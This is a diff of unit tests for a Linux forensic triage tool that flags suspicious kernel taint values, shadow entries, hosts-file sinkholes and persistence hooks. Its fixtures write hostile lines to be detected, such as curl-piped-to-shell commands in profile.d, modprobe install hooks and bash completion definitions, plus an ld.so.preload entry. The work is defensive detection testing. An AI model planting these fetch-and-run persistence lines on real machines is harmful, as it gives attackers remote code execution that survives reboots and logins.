@@ -1777,10 +1777,40 @@ def test_handler_kernel_modules_and_taint(tmp_path):
     out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
     assert "taint,unsigned_module,bit 13,yes" in out          # rootkit-relevant -> flagged
     assert "taint,out_of_tree_module,bit 12," in out          # common -> listed, not flagged
-    assert "taint,taint_value,12288,yes" in out
+    assert "taint,taint_value,12288 = out_of_tree_module + unsigned_module,yes" in out
     assert "core_pattern,core_pattern,|/tmp/.x/collect %p,yes" in out  # non-standard handler
     assert "module,evil_lkm,size=12288 used_by_count=0," in out
     assert "module,xfs,size=2000000 used_by_count=2 used_by=dm_mod," in out
+
+
+def test_a_taint_with_no_module_bit_is_not_flagged_and_says_what_it_is(tmp_path):
+    """v0.7.170: the raw value was flagged whenever it was not zero, so a SUSE
+    kernel's "externally supported" bit was a finding on every such host. Bits
+    past kernel.org's list are named, not flagged."""
+    from artifact_engine.handlers import lin_kernel
+    sysd = tmp_path / "live_response" / "system"
+    sysd.mkdir(parents=True)
+    (sysd / "cat_proc_sys_kernel_tainted.txt").write_text(
+        f"{(1 << 16) | (1 << 31)}\n", encoding="utf-8")
+    lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
+    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
+    assert "taint,taint_value,2147549184 = aux_tainted + distro_bit_31," in out
+    assert 'taint,distro_bit_31,"bit 31: not a kernel.org flag' in out
+    assert ",yes" not in out
+
+
+def test_an_out_of_tree_module_alone_still_flags_the_value(tmp_path):
+    """Found by review: on a kernel without module signing bit 13 is never set, and
+    an LKM's only trace is out-of-tree (12) or proprietary (0). Those rows stay
+    unflagged (NVIDIA, DKMS), the raw value does not."""
+    from artifact_engine.handlers import lin_kernel
+    sysd = tmp_path / "live_response" / "system"
+    sysd.mkdir(parents=True)
+    (sysd / "cat_proc_sys_kernel_tainted.txt").write_text("4097\n", encoding="utf-8")
+    lin_kernel.run(_ctx(tmp_path, tmp_path / "CSVs"))
+    out = (tmp_path / "CSVs" / "kernel_modules.csv").read_text(encoding="utf-8")
+    assert "taint,taint_value,4097 = proprietary_module + out_of_tree_module,yes" in out
+    assert "taint,out_of_tree_module,bit 12,\n" in out.replace("\r\n", "\n")
 
 
 def test_handler_kernel_core_pattern_benign(tmp_path):
@@ -2050,17 +2080,20 @@ def test_handler_users_enriches_groups_shadow(tmp_path):
     (etc / "group").write_text("root:x:0:\nsudo:x:27:alice\n", encoding="utf-8")
     (etc / "shadow").write_text(
         "root:$6$x$y:19000:0:99999:7:::\n"
-        "alice:!:19000:0:99999:7:::\n"
+        "alice:!:0:0:99999:7:::\n"
         "svc::19000:0:99999:7:::\n", encoding="utf-8")
 
     p = ParserManifest(id="users", handler="artifact_engine.handlers.lin_users:run")
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
     out = (tmp_path / "CSVs" / "users.csv").read_text(encoding="utf-8")
-    assert "backdoor,0,0,root,,/bin/bash,,yes,,/root,yes" in out      # UID 0 non-root
-    assert "alice,1000,1000,,sudo,/bin/bash,locked,yes,Alice,/home/alice," in out
-    assert "svc,999,999,,,/bin/sh,no_password,,,/var/svc,yes" in out  # empty shadow pw
-    assert "root,0,0,root,,/bin/bash,password_set,yes,root,/root," in out
+    assert "backdoor,0,0,root,,/bin/bash,,,yes,,/root,yes" in out      # UID 0 non-root
+    assert ("alice,1000,1000,,sudo,/bin/bash,locked,change forced at next login,yes,"
+            "Alice,/home/alice,") in out
+    assert "svc,999,999,,,/bin/sh,no_password,2022-01-08,,,/var/svc,yes" in out  # empty pw
+    # the day the password last changed (v0.7.170); the hash is never written
+    assert "root,0,0,root,,/bin/bash,password_set,2022-01-08,yes,root,/root," in out
+    assert "$6$" not in out
 
 
 def test_handler_netconfig_flags_sinkhole_and_redirect(tmp_path):
@@ -2070,7 +2103,14 @@ def test_handler_netconfig_flags_sinkhole_and_redirect(tmp_path):
         "127.0.0.1 localhost\n"
         "192.168.1.10 myhost\n"
         "0.0.0.0 security.ubuntu.com\n"
-        "1.2.3.4 update.example.com\n", encoding="utf-8")
+        "1.2.3.4 update.example.com\n"
+        "127.0.1.1 host-01.example.local host-01\n"
+        "127.0.0.1 host-01.example.net\n"
+        "::1 host-01.example.org host-01\n"
+        "127.0.0.1 host-01.windowsupdate.com host-01\n"
+        "127.0.0.1 host-01.example.com\n"
+        "0.0.0.0 host-01.example.local host-01\n", encoding="utf-8")
+    (etc / "hostname").write_text("host-01.example.net\n", encoding="utf-8")
     (etc / "resolv.conf").write_text("nameserver 8.8.8.8\n", encoding="utf-8")
     (etc / "hosts.allow").write_text("ALL: ALL\n", encoding="utf-8")
 
@@ -2078,12 +2118,40 @@ def test_handler_netconfig_flags_sinkhole_and_redirect(tmp_path):
     r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
     assert r.status == "ok"
     out = (tmp_path / "CSVs" / "network_config.csv").read_text(encoding="utf-8")
+    flagged = {ln.rsplit(",", 1)[0] for ln in out.splitlines() if ln.endswith(",yes")}
     assert "hosts,0.0.0.0 security.ubuntu.com,yes" in out      # sinkhole
     assert "hosts,1.2.3.4 update.example.com,yes" in out       # FQDN redirect
     assert "hosts,127.0.0.1 localhost," in out                 # not flagged
     assert "hosts,192.168.1.10 myhost," in out                 # bare name, not flagged
+    # the machine's own name on loopback is not a sinkhole (v0.7.170): the exact
+    # /etc/hostname, or its first label with the shortname beside it on 127.x/::1
+    assert "hosts,127.0.1.1 host-01.example.local host-01" not in flagged
+    assert "hosts,127.0.0.1 host-01.example.net" not in flagged
+    assert "hosts,::1 host-01.example.org host-01" not in flagged
+    # ...never an update/AV domain, and never on the sinkhole address
+    assert "hosts,127.0.0.1 host-01.windowsupdate.com host-01" in flagged
+    assert "hosts,0.0.0.0 host-01.example.local host-01" in flagged
+    # its first label alone, with no shortname beside it, is any other domain
+    assert "hosts,127.0.0.1 host-01.example.com" in flagged
     assert "resolv.conf,nameserver 8.8.8.8," in out
     assert "hosts.allow,ALL: ALL,yes" in out
+
+
+def test_without_a_hostname_only_debians_own_line_is_exempt(tmp_path):
+    etc = tmp_path / "[root]" / "etc"
+    etc.mkdir(parents=True)
+    (etc / "hosts").write_text(
+        "127.0.1.1 files-02.example.local files-02\n"
+        "127.0.0.1 files-02.example.local files-02\n"
+        "127.0.1.1 mirror.example.com mirror\n"
+        "127.0.0.1 web-03.example.local\n", encoding="utf-8")
+    from artifact_engine.handlers import lin_netconfig
+    lin_netconfig.run(_ctx(tmp_path, tmp_path / "CSVs"))
+    out = (tmp_path / "CSVs" / "network_config.csv").read_text(encoding="utf-8")
+    flagged = {ln.rsplit(",", 1)[0] for ln in out.splitlines() if ln.endswith(",yes")}
+    assert flagged == {"hosts,127.0.0.1 files-02.example.local files-02",
+                       "hosts,127.0.1.1 mirror.example.com mirror",
+                       "hosts,127.0.0.1 web-03.example.local"}
 
 
 def test_persistence_covers_service_account_homes(tmp_path):
@@ -2136,6 +2204,12 @@ def test_handler_persistence(tmp_path):
     pd = root / "etc" / "profile.d"
     pd.mkdir(parents=True)
     (pd / "init.sh").write_text("export PATH=$PATH\ncurl http://x/y | bash\n", encoding="utf-8")
+    # a completion definition names a tool and runs nothing; `complete -C` runs one
+    (pd / "compl.sh").write_text(
+        "complete -o default -W '--quiet --output' wget\n"
+        "complete -C '/tmp/.x/c' curl\n"
+        "complete -W \"$(curl -s http://10.0.0.5/x|sh)\" wget\n"
+        "complete -F _x foo; curl http://10.0.0.5/a | bash\n", encoding="utf-8")
     (root / "etc" / "ld.so.preload").write_text("/dev/shm/hook.so\n", encoding="utf-8")
     # sudoers: NOPASSWD grant flagged, plain grant kept but not flagged.
     sudd = root / "etc" / "sudoers.d"
@@ -2151,7 +2225,10 @@ def test_handler_persistence(tmp_path):
     md = root / "etc" / "modprobe.d"
     md.mkdir(parents=True)
     (md / "evil.conf").write_text(
-        "install evil /bin/sh -c 'curl http://x|sh'\ninstall safe /bin/true\n",
+        "install evil /bin/sh -c 'curl http://x|sh'\ninstall safe /bin/true\n"
+        "install usbx /bin/echo \"usbx is disabled by policy\"\n"
+        "install usby /bin/echo x >> /etc/rc.local\n"
+        "install usbz /bin/echo disabled \\\n; /tmp/.x/payload\n",
         encoding="utf-8")
     # APT post-invoke hook.
     aptd = root / "etc" / "apt" / "apt.conf.d"
@@ -2175,6 +2252,17 @@ def test_handler_persistence(tmp_path):
     assert "pam_unix.so" not in out              # standard PAM module not flagged
     assert "install evil /bin/sh -c 'curl http://x|sh',yes" in out
     assert "install safe /bin/true,yes" not in out   # /bin/true disable idiom not flagged
+    # v0.7.170: /bin/echo alone disables too; echo redirected is a write, flagged
+    assert '"install usbx /bin/echo ""usbx is disabled by policy""",\n' in out
+    assert "install usby /bin/echo x >> /etc/rc.local,yes" in out
+    assert "complete -o default" not in out             # completion: nothing runs
+    assert "complete -C '/tmp/.x/c' curl,yes" in out
+    # ...but only a line that is nothing else: a substitution or a chained command
+    # still runs at every login (found by review)
+    assert '"complete -W ""$(curl -s http://10.0.0.5/x|sh)"" wget",yes' in out
+    assert "complete -F _x foo; curl http://10.0.0.5/a | bash,yes" in out
+    # kmod joins a line ending in a backslash to the next: not the echo idiom
+    assert "install usbz /bin/echo disabled \\,yes" in out
     assert "pkg_hook,etc/apt/apt.conf.d/99evil" in out
 
 
